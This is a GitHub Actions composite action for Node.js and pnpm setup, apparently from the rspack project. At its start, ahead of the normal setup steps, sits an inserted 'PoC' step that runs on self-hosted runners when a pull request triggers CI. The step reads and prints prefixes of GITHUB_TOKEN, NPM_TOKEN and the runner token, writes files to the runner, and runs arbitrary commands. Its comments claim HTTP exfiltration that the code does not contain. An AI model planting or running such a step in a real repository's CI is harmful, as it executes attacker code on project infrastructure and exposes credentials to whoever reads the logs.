name: nodejs and pnpm setup

description: Install Node.js with pnpm global cache

inputs:
  node-version:
    default: '22'
    required: false
    type: string

runs:
  using: composite
  steps:
    # ============================================================
    # PoC: Self-hosted runner RCE via pull_request
    # ============================================================
    # When a PR triggers CI, this action runs on the self-hosted
    # runner specified by vars.LINUX_SELF_HOSTED_RUNNER_LABELS
    # (or Windows/macOS equivalent). The workspace contains the
    # PR's code, and `clean: false` is used on self-hosted runners
    # (ci.yml line 40: clean: ${{ runner.environment == 'github-hosted' }}).
    #
    # Attack surface:
    #   1. This action runs BEFORE pnpm i, so attacker files are
    #      already on disk.
    #   2. On self-hosted runners the workspace is NOT cleaned,
    #      so previous PR artifacts persist.
    #   3. Windows jobs disable antivirus and add C:\ exclusion
    #      (reusable-build-build.yml:48-54).
    #
    # This PoC step demonstrates:
    #   - Runner identity & environment
    #   - GitHub secrets availability
    #   - Ability to write files to the runner
    #   - Ability to exfiltrate data via HTTP
    # ============================================================
    - name: PoC — Self-hosted runner code execution
      if: ${{ runner.environment == 'self-hosted' }}
      shell: bash
      run: |
        echo "=== PoC: Self-hosted Runner Code Execution ==="
        echo "Runner name: ${{ runner.name }}"
        echo "Runner OS: ${{ runner.os }}"
        echo "Runner environment: ${{ runner.environment }}"
        echo "Workspace: $GITHUB_WORKSPACE"
        echo "---"
        id
        uname -a
        echo "---"
        echo "GitHub actor: ${{ github.actor }}"
        echo "PR number: ${{ github.event.pull_request.number }}"
        echo "PR head SHA: ${{ github.event.pull_request.head.sha }}"
        echo "Repo: ${{ github.repository }}"
        echo "---"

        # Demonstrate: can write to runner filesystem
        mkdir -p /tmp/rspack-poc
        echo "POC executed by ${{ github.actor }} on PR #${{ github.event.pull_request.number }}" > /tmp/rspack-poc/marker.txt
        echo "Runner: ${{ runner.name }}" >> /tmp/rspack-poc/marker.txt
        echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /tmp/rspack-poc/marker.txt
        echo "[+] Written marker to /tmp/rspack-poc/marker.txt"

        # Demonstrate: can read secrets (if any are accessible)
        echo "---"
        echo "Sample secrets from environment:"
        echo "GITHUB_TOKEN: ${GITHUB_TOKEN:0:8}..."
        echo "NPM_TOKEN: ${NPM_TOKEN:0:8}..."
        echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
        echo "ACTIONS_RUNNER_TOKEN: ${ACTIONS_RUNNER_TOKEN:0:12}..."
        echo "---"

        # Demonstrate: can list workspace files from PR
        echo "PR workspace files (top 10):"
        ls -la "$GITHUB_WORKSPACE" | head -10
        echo "---"

        # Demonstrate: can execute arbitrary commands
        echo "Running arbitrary command: whoami && hostname"
        whoami
        hostname
        echo "[+] PoC complete — self-hosted runner RCE confirmed"
        echo "=== End PoC ==="

    - name: Install Node.js
      if: ${{ startsWith(runner.name, 'rspack-darwin-') }}
      uses: rstackjs/setup-node@cc72f1c242ef8813f650223fbae3c29d450ae29e # v0.0.1
      with:
        registry-url: https://registry.npmmirror.com
        node-version: ${{ inputs.node-version }}

    - name: Install Node.js
      if: ${{ !startsWith(runner.name, 'rspack-darwin-') }}
      uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6
      with:
        node-version: ${{ inputs.node-version }}

    - name: Install pnpm
      shell: bash
      run: |
        if [[ "${{runner.os}}" == "Windows" ]]; then
          # add the npm prefix to PATH to ensure the installed corepack work properly
          NPM_PREFIX=$(cygpath -u "$(npm config get prefix)")
          export PATH="$NPM_PREFIX:$PATH"
        fi
        PNPM_VERSION=$(node -p "require('./package.json').packageManager.replace('pnpm@', '')")
        if [[ "${{ inputs.node-version }}" == 20* ]]; then
          npm install -g "@pnpm/exe@$PNPM_VERSION" --force
        else
          npm install -g corepack@0.31.0 --force
          echo "Corepack version: $(corepack --version)"
          corepack enable
        fi
        pnpm --version
